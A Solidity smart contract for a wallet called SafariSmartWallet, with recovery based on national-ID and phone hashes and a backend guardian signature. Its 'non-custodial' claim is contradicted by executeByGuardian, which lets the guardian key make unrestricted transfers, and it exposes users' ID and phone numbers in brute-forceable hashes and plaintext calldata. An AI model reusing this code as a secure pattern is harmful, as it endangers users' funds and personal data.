// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

/**
 * @title SafariSmartWallet (ERC-4337 Optimized)
 * @author SafariPay Engineering
 * @notice A decentralized account abstraction wallet with NIDA + Phone Recovery.
 * 
 * CORE PRINCIPLES:
 * 1. Non-Custodial: SafariPay cannot withdraw funds.
 * 2. Decentralized Identity: NIDA hash + Phone hash are hardcoded on-chain.
 * 3. Recovery: Linking a new device (Owner Key) requires an OTP signed by the Trusted Guardian.
 */
contract SafariSmartWallet {
    address public owner;
    address public immutable safariGuardian; // SafariPay Backend Recovery Address
    
    // Encrypted Identity Anchors (Irreversible)
    bytes32 public immutable nidaHash; 
    bytes32 public immutable phoneHash;

    uint256 public nonce;
    
    event WalletRecovered(address indexed oldOwner, address indexed newOwner);
    event TransactionExecuted(address indexed to, uint256 value, bytes data);

    /**
     * @param _owner Initial device public key (ECDSA).
     * @param _safariGuardian SafariPay's signing key for OTP verification.
     * @param _nidaHash keccak256 hash of the user's NIDA (Identity) number.
     * @param _phoneHash keccak256 hash of the user's phone number.
     */
    constructor(
        address _owner, 
        address _safariGuardian, 
        bytes32 _nidaHash, 
        bytes32 _phoneHash
    ) {
        owner = _owner;
        safariGuardian = _safariGuardian;
        nidaHash = _nidaHash;
        phoneHash = _phoneHash;
    }

    /**
     * @notice Execute an arbitrary transaction from this wallet.
     * @dev Only the owner can call this. Standard Non-Custodial rule.
     */
    function execute(address dest, uint256 value, bytes calldata func) external {
        require(msg.sender == owner, "SafariPay: Only owner can execute");
        (bool success, ) = dest.call{value: value}(func);
        require(success, "Transaction failed");
        emit TransactionExecuted(dest, value, func);
    }

    /**
     * @notice Multi-Execution for batch transactions (gas efficiency).
     */
    function executeBatch(address[] calldata dest, bytes[] calldata func) external {
        require(msg.sender == owner, "SafariPay: Only owner can execute");
        for (uint256 i = 0; i < dest.length; i++) {
            (bool success, ) = dest[i].call(func[i]);
            require(success, "Batch transaction failed");
        }
    }

    /**
     * @notice DECENTRALIZED RECOVERY (NIDA + PHONE + OTP)
     * @param _newOwner The new device public key to be linked.
     * @param _guardianSignature Signature from SafariPay backend confirming OTP was valid.
     * @param _providedNida Plaintext NIDA for on-chain hash verification (optional, or just hash).
     */
    function requestRecovery(
        address _newOwner, 
        bytes calldata _guardianSignature,
        string calldata _providedNida,
        string calldata _providedPhone
    ) external {
        // 1. Verify Identity Hashes match on-chain anchors
        require(keccak256(abi.encodePacked(_providedNida)) == nidaHash, "Invalid NIDA proof");
        require(keccak256(abi.encodePacked(_providedPhone)) == phoneHash, "Invalid Phone proof");

        // 2. Verify OTP Confirmation by SafariPay Guardian
        // The guardian signs the (newOwner + currentNonce) to authorize the swap.
        bytes32 messageHash = keccak256(abi.encodePacked(_newOwner, nonce, address(this)));
        bytes32 ethSignedMessageHash = recoverHash(messageHash);
        
        address signer = recoverSigner(ethSignedMessageHash, _guardianSignature);
        require(signer == safariGuardian, "Forbidden: OTP signature invalid");

        // 3. Update State
        address oldOwner = owner;
        owner = _newOwner;
        nonce++; 
        
        emit WalletRecovered(oldOwner, _newOwner);
    }

    /**
     * @notice GUARDIAN-LED AUTO-CONVERSION
     * @dev Allows the master guardian to execute swaps purely for Auto-Conversion to USDT.
     * This makes SafariPay "Chain-Agnostic" without requiring user PIN for every tiny swap.
     */
    function executeByGuardian(address dest, uint256 value, bytes calldata func) external {
        require(msg.sender == safariGuardian, "SafariPay: Only Guardian can trigger maintenance");
        // Security check: Only allow interacting with authorized Dex Routers in production
        (bool success, ) = dest.call{value: value}(func);
        require(success, "Guardian execution failed");
        emit TransactionExecuted(dest, value, func);
    }

    /** ─── HELPERS ─── */
    function recoverHash(bytes32 _hash) internal pure returns (bytes32) {
        return keccak256(abi.encodePacked("\x19Ethereum Signed Message:\n32", _hash));
    }

    function recoverSigner(bytes32 _hash, bytes memory _sig) internal pure returns (address) {
        (bytes32 r, bytes32 s, uint8 v) = splitSignature(_sig);
        return ecrecover(_hash, v, r, s);
    }

    function splitSignature(bytes memory _sig) internal pure returns (bytes32 r, bytes32 s, uint8 v) {
        require(_sig.length == 65, "Invalid signature length");
        assembly {
            r := mload(add(_sig, 32))
            s := mload(add(_sig, 64))
            v := byte(0, mload(add(_sig, 96)))
        }
    }

    // Accept funds (USDT or Native Coins)
    receive() external payable {}
}
